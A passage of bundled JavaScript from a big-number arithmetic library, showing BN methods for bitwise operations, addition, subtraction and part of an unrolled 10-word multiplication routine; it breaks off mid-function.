                    (BN.prototype.uor = function (num) {
                        return this.length > num.length ? this.clone().iuor(num) : num.clone().iuor(this);
                    }),
                    (BN.prototype.iuand = function (num) {
                        var b;
                        b = this.length > num.length ? num : this;
                        for (var i = 0; i < b.length; i++) this.words[i] = this.words[i] & num.words[i];
                        return (this.length = b.length), this.strip();
                    }),
                    (BN.prototype.iand = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuand(num);
                    }),
                    (BN.prototype.and = function (num) {
                        return this.length > num.length ? this.clone().iand(num) : num.clone().iand(this);
                    }),
                    (BN.prototype.uand = function (num) {
                        return this.length > num.length ? this.clone().iuand(num) : num.clone().iuand(this);
                    }),
                    (BN.prototype.iuxor = function (num) {
                        var a, b;
                        this.length > num.length ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var i = 0; i < b.length; i++) this.words[i] = a.words[i] ^ b.words[i];
                        if (this !== a) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return (this.length = a.length), this.strip();
                    }),
                    (BN.prototype.ixor = function (num) {
                        return assert(0 == (this.negative | num.negative)), this.iuxor(num);
                    }),
                    (BN.prototype.xor = function (num) {
                        return this.length > num.length ? this.clone().ixor(num) : num.clone().ixor(this);
                    }),
                    (BN.prototype.uxor = function (num) {
                        return this.length > num.length ? this.clone().iuxor(num) : num.clone().iuxor(this);
                    }),
                    (BN.prototype.inotn = function (width) {
                        assert("number" == typeof width && width >= 0);
                        var bytesNeeded = 0 | Math.ceil(width / 26),
                            bitsLeft = width % 26;
                        this._expand(bytesNeeded), bitsLeft > 0 && bytesNeeded--;
                        for (var i = 0; i < bytesNeeded; i++) this.words[i] = 67108863 & ~this.words[i];
                        return bitsLeft > 0 && (this.words[i] = ~this.words[i] & (67108863 >> (26 - bitsLeft))), this.strip();
                    }),
                    (BN.prototype.notn = function (width) {
                        return this.clone().inotn(width);
                    }),
                    (BN.prototype.setn = function (bit, val) {
                        assert("number" == typeof bit && bit >= 0);
                        var off = (bit / 26) | 0,
                            wbit = bit % 26;
                        return this._expand(off + 1), (this.words[off] = val ? this.words[off] | (1 << wbit) : this.words[off] & ~(1 << wbit)), this.strip();
                    }),
                    (BN.prototype.iadd = function (num) {
                        var r, a, b;
                        if (0 !== this.negative && 0 === num.negative) return (this.negative = 0), (r = this.isub(num)), (this.negative ^= 1), this._normSign();
                        if (0 === this.negative && 0 !== num.negative) return (num.negative = 0), (r = this.isub(num)), (num.negative = 1), r._normSign();
                        this.length > num.length ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var carry = 0, i = 0; i < b.length; i++) (r = (0 | a.words[i]) + (0 | b.words[i]) + carry), (this.words[i] = 67108863 & r), (carry = r >>> 26);
                        for (; 0 !== carry && i < a.length; i++) (r = (0 | a.words[i]) + carry), (this.words[i] = 67108863 & r), (carry = r >>> 26);
                        if (((this.length = a.length), 0 !== carry)) (this.words[this.length] = carry), this.length++;
                        else if (a !== this) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return this;
                    }),
                    (BN.prototype.add = function (num) {
                        var res;
                        return 0 !== num.negative && 0 === this.negative
                            ? ((num.negative = 0), (res = this.sub(num)), (num.negative ^= 1), res)
                            : 0 === num.negative && 0 !== this.negative
                            ? ((this.negative = 0), (res = num.sub(this)), (this.negative = 1), res)
                            : this.length > num.length
                            ? this.clone().iadd(num)
                            : num.clone().iadd(this);
                    }),
                    (BN.prototype.isub = function (num) {
                        if (0 !== num.negative) {
                            num.negative = 0;
                            var r = this.iadd(num);
                            return (num.negative = 1), r._normSign();
                        }
                        if (0 !== this.negative) return (this.negative = 0), this.iadd(num), (this.negative = 1), this._normSign();
                        var a,
                            b,
                            cmp = this.cmp(num);
                        if (0 === cmp) return (this.negative = 0), (this.length = 1), (this.words[0] = 0), this;
                        cmp > 0 ? ((a = this), (b = num)) : ((a = num), (b = this));
                        for (var carry = 0, i = 0; i < b.length; i++) (carry = (r = (0 | a.words[i]) - (0 | b.words[i]) + carry) >> 26), (this.words[i] = 67108863 & r);
                        for (; 0 !== carry && i < a.length; i++) (carry = (r = (0 | a.words[i]) + carry) >> 26), (this.words[i] = 67108863 & r);
                        if (0 === carry && i < a.length && a !== this) for (; i < a.length; i++) this.words[i] = a.words[i];
                        return (this.length = Math.max(this.length, i)), a !== this && (this.negative = 1), this.strip();
                    }),
                    (BN.prototype.sub = function (num) {
                        return this.clone().isub(num);
                    });
                var comb10MulTo = function (self, num, out) {
                    var lo,
                        mid,
                        hi,
                        a = self.words,
                        b = num.words,
                        o = out.words,
                        c = 0,
                        a0 = 0 | a[0],
                        al0 = 8191 & a0,
                        ah0 = a0 >>> 13,
                        a1 = 0 | a[1],
                        al1 = 8191 & a1,
                        ah1 = a1 >>> 13,
                        a2 = 0 | a[2],
                        al2 = 8191 & a2,
                        ah2 = a2 >>> 13,
                        a3 = 0 | a[3],
                        al3 = 8191 & a3,
                        ah3 = a3 >>> 13,
                        a4 = 0 | a[4],
                        al4 = 8191 & a4,
                        ah4 = a4 >>> 13,
                        a5 = 0 | a[5],
                        al5 = 8191 & a5,
                        ah5 = a5 >>> 13,
                        a6 = 0 | a[6],
                        al6 = 8191 & a6,
                        ah6 = a6 >>> 13,
                        a7 = 0 | a[7],
                        al7 = 8191 & a7,
                        ah7 = a7 >>> 13,
                        a8 = 0 | a[8],
                        al8 = 8191 & a8,
                        ah8 = a8 >>> 13,
                        a9 = 0 | a[9],
                        al9 = 8191 & a9,
                        ah9 = a9 >>> 13,
                        b0 = 0 | b[0],
                        bl0 = 8191 & b0,
                        bh0 = b0 >>> 13,
                        b1 = 0 | b[1],
                        bl1 = 8191 & b1,
                        bh1 = b1 >>> 13,
                        b2 = 0 | b[2],
                        bl2 = 8191 & b2,
                        bh2 = b2 >>> 13,
                        b3 = 0 | b[3],
                        bl3 = 8191 & b3,
                        bh3 = b3 >>> 13,
                        b4 = 0 | b[4],
                        bl4 = 8191 & b4,
                        bh4 = b4 >>> 13,
                        b5 = 0 | b[5],
                        bl5 = 8191 & b5,
                        bh5 = b5 >>> 13,
                        b6 = 0 | b[6],
                        bl6 = 8191 & b6,
                        bh6 = b6 >>> 13,
                        b7 = 0 | b[7],
                        bl7 = 8191 & b7,
                        bh7 = b7 >>> 13,
                        b8 = 0 | b[8],
                        bl8 = 8191 & b8,
                        bh8 = b8 >>> 13,
                        b9 = 0 | b[9],
                        bl9 = 8191 & b9,
                        bh9 = b9 >>> 13;
                    (out.negative = self.negative ^ num.negative), (out.length = 19);
                    var w0 = (((c + (lo = Math.imul(al0, bl0))) | 0) + ((8191 & (mid = ((mid = Math.imul(al0, bh0)) + Math.imul(ah0, bl0)) | 0)) << 13)) | 0;
                    (c = ((((hi = Math.imul(ah0, bh0)) + (mid >>> 13)) | 0) + (w0 >>> 26)) | 0), (w0 &= 67108863), (lo = Math.imul(al1, bl0)), (mid = ((mid = Math.imul(al1, bh0)) + Math.imul(ah1, bl0)) | 0), (hi = Math.imul(ah1, bh0));
                    var w1 = (((c + (lo = (lo + Math.imul(al0, bl1)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh1)) | 0) + Math.imul(ah0, bl1)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh1)) | 0) + (mid >>> 13)) | 0) + (w1 >>> 26)) | 0),
                        (w1 &= 67108863),
                        (lo = Math.imul(al2, bl0)),
                        (mid = ((mid = Math.imul(al2, bh0)) + Math.imul(ah2, bl0)) | 0),
                        (hi = Math.imul(ah2, bh0)),
                        (lo = (lo + Math.imul(al1, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh1)) | 0) + Math.imul(ah1, bl1)) | 0),
                        (hi = (hi + Math.imul(ah1, bh1)) | 0);
                    var w2 = (((c + (lo = (lo + Math.imul(al0, bl2)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh2)) | 0) + Math.imul(ah0, bl2)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh2)) | 0) + (mid >>> 13)) | 0) + (w2 >>> 26)) | 0),
                        (w2 &= 67108863),
                        (lo = Math.imul(al3, bl0)),
                        (mid = ((mid = Math.imul(al3, bh0)) + Math.imul(ah3, bl0)) | 0),
                        (hi = Math.imul(ah3, bh0)),
                        (lo = (lo + Math.imul(al2, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh1)) | 0) + Math.imul(ah2, bl1)) | 0),
                        (hi = (hi + Math.imul(ah2, bh1)) | 0),
                        (lo = (lo + Math.imul(al1, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh2)) | 0) + Math.imul(ah1, bl2)) | 0),
                        (hi = (hi + Math.imul(ah1, bh2)) | 0);
                    var w3 = (((c + (lo = (lo + Math.imul(al0, bl3)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh3)) | 0) + Math.imul(ah0, bl3)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh3)) | 0) + (mid >>> 13)) | 0) + (w3 >>> 26)) | 0),
                        (w3 &= 67108863),
                        (lo = Math.imul(al4, bl0)),
                        (mid = ((mid = Math.imul(al4, bh0)) + Math.imul(ah4, bl0)) | 0),
                        (hi = Math.imul(ah4, bh0)),
                        (lo = (lo + Math.imul(al3, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh1)) | 0) + Math.imul(ah3, bl1)) | 0),
                        (hi = (hi + Math.imul(ah3, bh1)) | 0),
                        (lo = (lo + Math.imul(al2, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh2)) | 0) + Math.imul(ah2, bl2)) | 0),
                        (hi = (hi + Math.imul(ah2, bh2)) | 0),
                        (lo = (lo + Math.imul(al1, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh3)) | 0) + Math.imul(ah1, bl3)) | 0),
                        (hi = (hi + Math.imul(ah1, bh3)) | 0);
                    var w4 = (((c + (lo = (lo + Math.imul(al0, bl4)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh4)) | 0) + Math.imul(ah0, bl4)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh4)) | 0) + (mid >>> 13)) | 0) + (w4 >>> 26)) | 0),
                        (w4 &= 67108863),
                        (lo = Math.imul(al5, bl0)),
                        (mid = ((mid = Math.imul(al5, bh0)) + Math.imul(ah5, bl0)) | 0),
                        (hi = Math.imul(ah5, bh0)),
                        (lo = (lo + Math.imul(al4, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh1)) | 0) + Math.imul(ah4, bl1)) | 0),
                        (hi = (hi + Math.imul(ah4, bh1)) | 0),
                        (lo = (lo + Math.imul(al3, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh2)) | 0) + Math.imul(ah3, bl2)) | 0),
                        (hi = (hi + Math.imul(ah3, bh2)) | 0),
                        (lo = (lo + Math.imul(al2, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh3)) | 0) + Math.imul(ah2, bl3)) | 0),
                        (hi = (hi + Math.imul(ah2, bh3)) | 0),
                        (lo = (lo + Math.imul(al1, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh4)) | 0) + Math.imul(ah1, bl4)) | 0),
                        (hi = (hi + Math.imul(ah1, bh4)) | 0);
                    var w5 = (((c + (lo = (lo + Math.imul(al0, bl5)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh5)) | 0) + Math.imul(ah0, bl5)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh5)) | 0) + (mid >>> 13)) | 0) + (w5 >>> 26)) | 0),
                        (w5 &= 67108863),
                        (lo = Math.imul(al6, bl0)),
                        (mid = ((mid = Math.imul(al6, bh0)) + Math.imul(ah6, bl0)) | 0),
                        (hi = Math.imul(ah6, bh0)),
                        (lo = (lo + Math.imul(al5, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh1)) | 0) + Math.imul(ah5, bl1)) | 0),
                        (hi = (hi + Math.imul(ah5, bh1)) | 0),
                        (lo = (lo + Math.imul(al4, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh2)) | 0) + Math.imul(ah4, bl2)) | 0),
                        (hi = (hi + Math.imul(ah4, bh2)) | 0),
                        (lo = (lo + Math.imul(al3, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh3)) | 0) + Math.imul(ah3, bl3)) | 0),
                        (hi = (hi + Math.imul(ah3, bh3)) | 0),
                        (lo = (lo + Math.imul(al2, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh4)) | 0) + Math.imul(ah2, bl4)) | 0),
                        (hi = (hi + Math.imul(ah2, bh4)) | 0),
                        (lo = (lo + Math.imul(al1, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh5)) | 0) + Math.imul(ah1, bl5)) | 0),
                        (hi = (hi + Math.imul(ah1, bh5)) | 0);
                    var w6 = (((c + (lo = (lo + Math.imul(al0, bl6)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh6)) | 0) + Math.imul(ah0, bl6)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh6)) | 0) + (mid >>> 13)) | 0) + (w6 >>> 26)) | 0),
                        (w6 &= 67108863),
                        (lo = Math.imul(al7, bl0)),
                        (mid = ((mid = Math.imul(al7, bh0)) + Math.imul(ah7, bl0)) | 0),
                        (hi = Math.imul(ah7, bh0)),
                        (lo = (lo + Math.imul(al6, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh1)) | 0) + Math.imul(ah6, bl1)) | 0),
                        (hi = (hi + Math.imul(ah6, bh1)) | 0),
                        (lo = (lo + Math.imul(al5, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh2)) | 0) + Math.imul(ah5, bl2)) | 0),
                        (hi = (hi + Math.imul(ah5, bh2)) | 0),
                        (lo = (lo + Math.imul(al4, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh3)) | 0) + Math.imul(ah4, bl3)) | 0),
                        (hi = (hi + Math.imul(ah4, bh3)) | 0),
                        (lo = (lo + Math.imul(al3, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh4)) | 0) + Math.imul(ah3, bl4)) | 0),
                        (hi = (hi + Math.imul(ah3, bh4)) | 0),
                        (lo = (lo + Math.imul(al2, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh5)) | 0) + Math.imul(ah2, bl5)) | 0),
                        (hi = (hi + Math.imul(ah2, bh5)) | 0),
                        (lo = (lo + Math.imul(al1, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh6)) | 0) + Math.imul(ah1, bl6)) | 0),
                        (hi = (hi + Math.imul(ah1, bh6)) | 0);
                    var w7 = (((c + (lo = (lo + Math.imul(al0, bl7)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh7)) | 0) + Math.imul(ah0, bl7)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh7)) | 0) + (mid >>> 13)) | 0) + (w7 >>> 26)) | 0),
                        (w7 &= 67108863),
                        (lo = Math.imul(al8, bl0)),
                        (mid = ((mid = Math.imul(al8, bh0)) + Math.imul(ah8, bl0)) | 0),
                        (hi = Math.imul(ah8, bh0)),
                        (lo = (lo + Math.imul(al7, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh1)) | 0) + Math.imul(ah7, bl1)) | 0),
                        (hi = (hi + Math.imul(ah7, bh1)) | 0),
                        (lo = (lo + Math.imul(al6, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh2)) | 0) + Math.imul(ah6, bl2)) | 0),
                        (hi = (hi + Math.imul(ah6, bh2)) | 0),
                        (lo = (lo + Math.imul(al5, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh3)) | 0) + Math.imul(ah5, bl3)) | 0),
                        (hi = (hi + Math.imul(ah5, bh3)) | 0),
                        (lo = (lo + Math.imul(al4, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh4)) | 0) + Math.imul(ah4, bl4)) | 0),
                        (hi = (hi + Math.imul(ah4, bh4)) | 0),
                        (lo = (lo + Math.imul(al3, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh5)) | 0) + Math.imul(ah3, bl5)) | 0),
                        (hi = (hi + Math.imul(ah3, bh5)) | 0),
                        (lo = (lo + Math.imul(al2, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh6)) | 0) + Math.imul(ah2, bl6)) | 0),
                        (hi = (hi + Math.imul(ah2, bh6)) | 0),
                        (lo = (lo + Math.imul(al1, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh7)) | 0) + Math.imul(ah1, bl7)) | 0),
                        (hi = (hi + Math.imul(ah1, bh7)) | 0);
                    var w8 = (((c + (lo = (lo + Math.imul(al0, bl8)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh8)) | 0) + Math.imul(ah0, bl8)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh8)) | 0) + (mid >>> 13)) | 0) + (w8 >>> 26)) | 0),
                        (w8 &= 67108863),
                        (lo = Math.imul(al9, bl0)),
                        (mid = ((mid = Math.imul(al9, bh0)) + Math.imul(ah9, bl0)) | 0),
                        (hi = Math.imul(ah9, bh0)),
                        (lo = (lo + Math.imul(al8, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh1)) | 0) + Math.imul(ah8, bl1)) | 0),
                        (hi = (hi + Math.imul(ah8, bh1)) | 0),
                        (lo = (lo + Math.imul(al7, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh2)) | 0) + Math.imul(ah7, bl2)) | 0),
                        (hi = (hi + Math.imul(ah7, bh2)) | 0),
                        (lo = (lo + Math.imul(al6, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh3)) | 0) + Math.imul(ah6, bl3)) | 0),
                        (hi = (hi + Math.imul(ah6, bh3)) | 0),
                        (lo = (lo + Math.imul(al5, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh4)) | 0) + Math.imul(ah5, bl4)) | 0),
                        (hi = (hi + Math.imul(ah5, bh4)) | 0),
                        (lo = (lo + Math.imul(al4, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh5)) | 0) + Math.imul(ah4, bl5)) | 0),
                        (hi = (hi + Math.imul(ah4, bh5)) | 0),
                        (lo = (lo + Math.imul(al3, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh6)) | 0) + Math.imul(ah3, bl6)) | 0),
                        (hi = (hi + Math.imul(ah3, bh6)) | 0),
                        (lo = (lo + Math.imul(al2, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh7)) | 0) + Math.imul(ah2, bl7)) | 0),
                        (hi = (hi + Math.imul(ah2, bh7)) | 0),
                        (lo = (lo + Math.imul(al1, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh8)) | 0) + Math.imul(ah1, bl8)) | 0),
                        (hi = (hi + Math.imul(ah1, bh8)) | 0);
                    var w9 = (((c + (lo = (lo + Math.imul(al0, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh9)) | 0) + Math.imul(ah0, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh9)) | 0) + (mid >>> 13)) | 0) + (w9 >>> 26)) | 0),
                        (w9 &= 67108863),
                        (lo = Math.imul(al9, bl1)),
                        (mid = ((mid = Math.imul(al9, bh1)) + Math.imul(ah9, bl1)) | 0),
                        (hi = Math.imul(ah9, bh1)),
                        (lo = (lo + Math.imul(al8, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh2)) | 0) + Math.imul(ah8, bl2)) | 0),
                        (hi = (hi + Math.imul(ah8, bh2)) | 0),
                        (lo = (lo + Math.imul(al7, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh3)) | 0) + Math.imul(ah7, bl3)) | 0),
                        (hi = (hi + Math.imul(ah7, bh3)) | 0),
                        (lo = (lo + Math.imul(al6, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh4)) | 0) + Math.imul(ah6, bl4)) | 0),
                        (hi = (hi + Math.imul(ah6, bh4)) | 0),
                        (lo = (lo + Math.imul(al5, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh5)) | 0) + Math.imul(ah5, bl5)) | 0),
                        (hi = (hi + Math.imul(ah5, bh5)) | 0),
                        (lo = (lo + Math.imul(al4, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh6)) | 0) + Math.imul(ah4, bl6)) | 0),
                        (hi = (hi + Math.imul(ah4, bh6)) | 0),
                        (lo = (lo + Math.imul(al3, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh7)) | 0) + Math.imul(ah3, bl7)) | 0),
                        (hi = (hi + Math.imul(ah3, bh7)) | 0),
                        (lo = (lo + Math.imul(al2, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh8)) | 0) + Math.imul(ah2, bl8)) | 0),
                        (hi = (hi + Math.imul(ah2, bh8)) | 0);
                    var w10 = (((c + (lo = (lo + Math.imul(al1, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al1, bh9)) | 0) + Math.imul(ah1, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah1, bh9)) | 0) + (mid >>> 13)) | 0) + (w10 >>> 26)) | 0),
                        (w10 &= 67108863),
                        (lo = Math.imul(al9, bl2)),
                        (mid = ((mid = Math.imul(al9, bh2)) + Math.imul(ah9, bl2)) | 0),
                        (hi = Math.imul(ah9, bh2)),
                        (lo = (lo + Math.imul(al8, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh3)) | 0) + Math.imul(ah8, bl3)) | 0),
                        (hi = (hi + Math.imul(ah8, bh3)) | 0),
                        (lo = (lo + Math.imul(al7, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh4)) | 0) + Math.imul(ah7, bl4)) | 0),
                        (hi = (hi + Math.imul(ah7, bh4)) | 0),
                        (lo = (lo + Math.imul(al6, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh5)) | 0) + Math.imul(ah6, bl5)) | 0),
                        (hi = (hi + Math.imul(ah6, bh5)) | 0),
                        (lo = (lo + Math.imul(al5, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh6)) | 0) + Math.imul(ah5, bl6)) | 0),
                        (hi = (hi + Math.imul(ah5, bh6)) | 0),
                        (lo = (lo + Math.imul(al4, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh7)) | 0) + Math.imul(ah4, bl7)) | 0),
                        (hi = (hi + Math.imul(ah4, bh7)) | 0),
                        (lo = (lo + Math.imul(al3, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh8)) | 0) + Math.imul(ah3, bl8)) | 0),
                        (hi = (hi + Math.imul(ah3, bh8)) | 0);
                    var w11 = (((c + (lo = (lo + Math.imul(al2, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al2, bh9)) | 0) + Math.imul(ah2, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah2, bh9)) | 0) + (mid >>> 13)) | 0) + (w11 >>> 26)) | 0),
                        (w11 &= 67108863),
                        (lo = Math.imul(al9, bl3)),
                        (mid = ((mid = Math.imul(al9, bh3)) + Math.imul(ah9, bl3)) | 0),
                        (hi = Math.imul(ah9, bh3)),
                        (lo = (lo + Math.imul(al8, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh4)) | 0) + Math.imul(ah8, bl4)) | 0),
                        (hi = (hi + Math.imul(ah8, bh4)) | 0),
                        (lo = (lo + Math.imul(al7, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh5)) | 0) + Math.imul(ah7, bl5)) | 0),
                        (hi = (hi + Math.imul(ah7, bh5)) | 0),
                        (lo = (lo + Math.imul(al6, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh6)) | 0) + Math.imul(ah6, bl6)) | 0),
                        (hi = (hi + Math.imul(ah6, bh6)) | 0),
                        (lo = (lo + Math.imul(al5, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh7)) | 0) + Math.imul(ah5, bl7)) | 0),
                        (hi = (hi + Math.imul(ah5, bh7)) | 0),
                        (lo = (lo + Math.imul(al4, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh8)) | 0) + Math.imul(ah4, bl8)) | 0),
                        (hi = (hi + Math.imul(ah4, bh8)) | 0);
                    var w12 = (((c + (lo = (lo + Math.imul(al3, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al3, bh9)) | 0) + Math.imul(ah3, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah3, bh9)) | 0) + (mid >>> 13)) | 0) + (w12 >>> 26)) | 0),
                        (w12 &= 67108863),
                        (lo = Math.imul(al9, bl4)),
                        (mid = ((mid = Math.imul(al9, bh4)) + Math.imul(ah9, bl4)) | 0),
                        (hi = Math.imul(ah9, bh4)),
                        (lo = (lo + Math.imul(al8, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh5)) | 0) + Math.imul(ah8, bl5)) | 0),
                        (hi = (hi + Math.imul(ah8, bh5)) | 0),
                        (lo = (lo + Math.imul(al7, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh6)) | 0) + Math.imul(ah7, bl6)) | 0),
                        (hi = (hi + Math.imul(ah7, bh6)) | 0),
                        (lo = (lo + Math.imul(al6, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh7)) | 0) + Math.imul(ah6, bl7)) | 0),
                        (hi = (hi + Math.imul(ah6, bh7)) | 0),
                        (lo = (lo + Math.imul(al5, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh8)) | 0) + Math.imul(ah5, bl8)) | 0),
                        (hi = (hi + Math.imul(ah5, bh8)) | 0);
                    var w13 = (((c + (lo = (lo + Math.imul(al4, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al4, bh9)) | 0) + Math.imul(ah4, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah4, bh9)) | 0) + (mid >>> 13)) | 0) + (w13 >>> 26)) | 0),
                        (w13 &= 67108863),
                        (lo = Math.imul(al9, bl5)),
                        (mid = ((mid = Math.imul(al9, bh5)) + Math.imul(ah9, bl5)) | 0),
                        (hi = Math.imul(ah9, bh5)),
                        (lo = (lo + Math.imul(al8, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh6)) | 0) + Math.imul(ah8, bl6)) | 0),
                        (hi = (hi + Math.imul(ah8, bh6)) | 0),
                        (lo = (lo + Math.imul(al7, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh7)) | 0) + Math.imul(ah7, bl7)) | 0),
                        (hi = (hi + Math.imul(ah7, bh7)) | 0),
                        (lo = (lo + Math.imul(al6, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh8)) | 0) + Math.imul(ah6, bl8)) | 0),
                        (hi = (hi + Math.imul(ah6, bh8)) | 0);
                    var w14 = (((c + (lo = (lo + Math.imul(al5, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al5, bh9)) | 0) + Math.imul(ah5, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah5, bh9)) | 0) + (mid >>> 13)) | 0) + (w14 >>> 26)) | 0),
                        (w14 &= 67108863),
                        (lo = Math.imul(al9, bl6)),
                        (mid = ((mid = Math.imul(al9, bh6)) + Math.imul(ah9, bl6)) | 0),
                        (hi = Math.imul(ah9, bh6)),
                        (lo = (lo + Math.imul(al8, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh7)) | 0) + Math.imul(ah8, bl7)) | 0),
                        (hi = (hi + Math.imul(ah8, bh7)) | 0),
                        (lo = (lo + Math.imul(al7, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh8)) | 0) + Math.imul(ah7, bl8)) | 0),
                        (hi = (hi + Math.imul(ah7, bh8)) | 0);
                    var w15 = (((c + (lo = (lo + Math.imul(al6, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al6, bh9)) | 0) + Math.imul(ah6, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah6, bh9)) | 0) + (mid >>> 13)) | 0) + (w15 >>> 26)) | 0),
                        (w15 &= 67108863),
                        (lo = Math.imul(al9, bl7)),
                        (mid = ((mid = Math.imul(al9, bh7)) + Math.imul(ah9, bl7)) | 0),
                        (hi = Math.imul(ah9, bh7)),
                        (lo = (lo + Math.imul(al8, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh8)) | 0) + Math.imul(ah8, bl8)) | 0),
                        (hi = (hi + Math.imul(ah8, bh8)) | 0);
